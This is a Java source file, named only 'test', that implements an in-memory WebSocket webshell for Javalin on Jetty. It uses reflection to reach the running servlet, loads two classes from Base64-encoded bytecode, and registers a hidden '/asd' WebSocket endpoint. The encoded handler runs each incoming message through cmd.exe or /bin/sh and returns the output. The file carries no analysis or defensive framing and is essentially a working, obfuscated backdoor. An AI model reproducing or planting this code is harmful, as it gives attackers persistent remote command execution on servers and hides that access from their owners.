import io.javalin.core.security.RouteRole;
import io.javalin.http.Context;
import io.javalin.jetty.JavalinJettyServlet;
import io.javalin.websocket.WsConfig;
import io.javalin.websocket.WsHandlerType;
import org.eclipse.jetty.server.HttpChannel;
import org.eclipse.jetty.server.Request;
import org.eclipse.jetty.servlet.ServletHolder;

import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashSet;
import java.util.Set;
import java.util.function.Consumer;

public class test {
    public static void printName() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, NoSuchFieldException {
        Field threadLocalsField = Thread.class.getDeclaredField("threadLocals");
        threadLocalsField.setAccessible(true);
        Object threadLocal = threadLocalsField.get(Thread.currentThread());
        Field tableField = threadLocal.getClass().getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(threadLocal);
        Field valueField, channelField;
        Object entry, value, channel = null;
        for (int i = 0; i < table.length; i++){
            entry = table[i];
            if (entry == null){
                continue;
            }
            valueField = entry.getClass().getDeclaredField("value");
            valueField.setAccessible(true);
            value = valueField.get(entry);
            if (value != null && value.getClass().getName().contains("HttpConnection")){
                channelField = value.getClass().getDeclaredField("_channel");
                channelField.setAccessible(true);
                channel = channelField.get(value);
                break;
            }
        }
        Method getRequestMethod = channel.getClass().getMethod("getRequest");
        getRequestMethod.setAccessible(true);
        Request request = (Request)getRequestMethod.invoke(channel);
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);
        Method getUserIdentityScopeMethod = request.getClass().getDeclaredMethod("getUserIdentityScope");
        getUserIdentityScopeMethod.setAccessible(true);
        ServletHolder scope = (ServletHolder) getUserIdentityScopeMethod.invoke(request);
        Method getServletMethod = scope.getClass().getDeclaredMethod("getServlet");
        getServletMethod.setAccessible(true);
        JavalinJettyServlet javalinJettyServlet = (JavalinJettyServlet) getServletMethod.invoke(scope);
        Set<RouteRole> roleInfos = new HashSet<RouteRole>();
        byte[] wsShellByte = Base64.getDecoder().decode("yv66vgAAADQAJAoACAAaBwAbCgACABoKAAUAHAcAHQoABwAeBwAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABRMY29udHJvbGxlci9Xc1NoZWxsOwEABmFjY2VwdAEAIihMaW8vamF2YWxpbi93ZWJzb2NrZXQvV3NDb25maWc7KVYBAAh3c0NvbmZpZwEAH0xpby9qYXZhbGluL3dlYnNvY2tldC9Xc0NvbmZpZzsBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAAlTaWduYXR1cmUBAFBMamF2YS9sYW5nL09iamVjdDtMamF2YS91dGlsL2Z1bmN0aW9uL0NvbnN1bWVyPExpby9qYXZhbGluL3dlYnNvY2tldC9Xc0NvbmZpZzs+OwEAClNvdXJjZUZpbGUBAAxXc1NoZWxsLmphdmEMAAoACwEAFGNvbnRyb2xsZXIvTXlIYW5kbGVyDAAiACMBAB1pby9qYXZhbGluL3dlYnNvY2tldC9Xc0NvbmZpZwwAEQASAQASY29udHJvbGxlci9Xc1NoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAG2phdmEvdXRpbC9mdW5jdGlvbi9Db25zdW1lcgEACW9uTWVzc2FnZQEAKihMaW8vamF2YWxpbi93ZWJzb2NrZXQvV3NNZXNzYWdlSGFuZGxlcjspVgAhAAcACAABAAkAAAADAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAABgAOAAAADAABAAAABQAPABAAAAABABEAEgABAAwAAABEAAMAAgAAAAwruwACWbcAA7YABLEAAAACAA0AAAAKAAIAAAAJAAsACgAOAAAAFgACAAAADAAPABAAAAAAAAwAEwAUAAEQQQARABUAAQAMAAAAMwACAAIAAAAJKivAAAW2AAaxAAAAAgANAAAABgABAAAABgAOAAAADAABAAAACQAPABAAAAACABYAAAACABcAGAAAAAIAGQ==");
        byte[] myHandlerByte = Base64.getDecoder().decode("yv66vgAAADQAgAoAGgA4CgA5ADoIADsIADwKAD0APgoACgA/CABACgAKAEEHAEIHAEMIAEQIAEUKAAkARggARwgASAcASQoACQBKCgBLAEwKABAATQgATgoAEABPCgAQAFAKABAAUQoAOQBSBwBTBwBUBwBVAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABZMY29udHJvbGxlci9NeUhhbmRsZXI7AQANaGFuZGxlTWVzc2FnZQEAKihMaW8vamF2YWxpbi93ZWJzb2NrZXQvV3NNZXNzYWdlQ29udGV4dDspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAEHdzTWVzc2FnZUNvbnRleHQBACdMaW8vamF2YWxpbi93ZWJzb2NrZXQvV3NNZXNzYWdlQ29udGV4dDsBAANjbWQBABJMamF2YS9sYW5nL1N0cmluZzsBAAFvAQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAA1TdGFja01hcFRhYmxlBwBDBwBCBwBJAQAKRXhjZXB0aW9ucwcAVgEAJFJ1bnRpbWVJbnZpc2libGVQYXJhbWV0ZXJBbm5vdGF0aW9ucwEAI0xvcmcvamV0YnJhaW5zL2Fubm90YXRpb25zL05vdE51bGw7AQAKU291cmNlRmlsZQEADk15SGFuZGxlci5qYXZhDAAcAB0HAFcMAFgAWQEAAAEAB29zLm5hbWUHAFoMAFsAXAwAXQBZAQADd2luDABeAF8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAcAGABAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAYQBiBwBjDABkAGUMABwAZgEAAlxBDABnAGgMAGkAagwAawBZDABsAG0BABRjb250cm9sbGVyL015SGFuZGxlcgEAEGphdmEvbGFuZy9PYmplY3QBACVpby9qYXZhbGluL3dlYnNvY2tldC9Xc01lc3NhZ2VIYW5kbGVyAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJWlvL2phdmFsaW4vd2Vic29ja2V0L1dzTWVzc2FnZUNvbnRleHQBAAdtZXNzYWdlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABHNlbmQBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvY29uY3VycmVudC9GdXR1cmU7AQARJCQkcmVwb3J0TnVsbCQkJDABAAQoSSlWDABuAG8KABkAcAEAPkFyZ3VtZW50IGZvciBATm90TnVsbCBwYXJhbWV0ZXIgJyVzJyBvZiAlcy4lcyBtdXN0IG5vdCBiZSBudWxsCAByCAAnCABTCAAjAQAGZm9ybWF0AQA5KExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9TdHJpbmc7DAB3AHgKAC8AeQEAImphdmEvbGFuZy9JbGxlZ2FsQXJndW1lbnRFeGNlcHRpb24HAHsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMABwAfQoAfAB+ACAAGQAaAAEAGwAAAAMAAAAcAB0AAQAeAAAALwABAAEAAAAFKrcAAbEAAAACAB8AAAAGAAEAAAAHACAAAAAMAAEAAAAFACEAIgAAAAEAIwAkAAMAHgAAATAABgAGAAAAiCvHAAcDuABxK7YAAk0SA04SBLgABbYABhIHtgAImQAhuwAwWQa9AC9ZAxILU1kEEgxTWQUsU7cADToEpwAeuwAwWQa9AC9ZAxIOU1kEEg9TWQUsU7cADToEuwAxWRkEtgARtgAStwATEhS2ABU6BRkFtgAWmQALGQW2ABenAAQtTisttgAYV7EAAAADAC4AAAAcAAUI/QA1BwAvBwAv/AAaBwAw/AAlBwAxQAcALwAfAAAAJgAJAAgACwANAAwAEAAOACAADwA+ABEAWQATAG8AFACBABUAhwAWACAAAABIAAcAOwADACUAJgAEAAAAiAAhACIAAAAAAIgAJwAoAAEADQB7ACkAKgACABAAeAArACoAAwBZAC8AJQAmAAQAbwAZACwALQAFADIAAAAEAAEAMwA0AAAABwEAAQA1AAAQCgBuAG8AAQAeAAAALQAFAAEAAAAhEnMGvQAaWQMSdFNZBBJ1U1kFEnZTuAB6uwB8Wl+3AH+/AAAAAAABADYAAAACADc=");
        Class wsShellClass = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), "controller.WsShell", wsShellByte, 0, wsShellByte.length);
        Class myHandlerClass = (Class) defineClassMethod.invoke(Thread.currentThread().getContextClassLoader(), "controller.MyHandler", myHandlerByte, 0, myHandlerByte.length);
        Object wsShell = wsShellClass.newInstance();
        javalinJettyServlet.addHandler(WsHandlerType.WEBSOCKET, "/asd", (Consumer<WsConfig>)wsShell, roleInfos);
    }
}
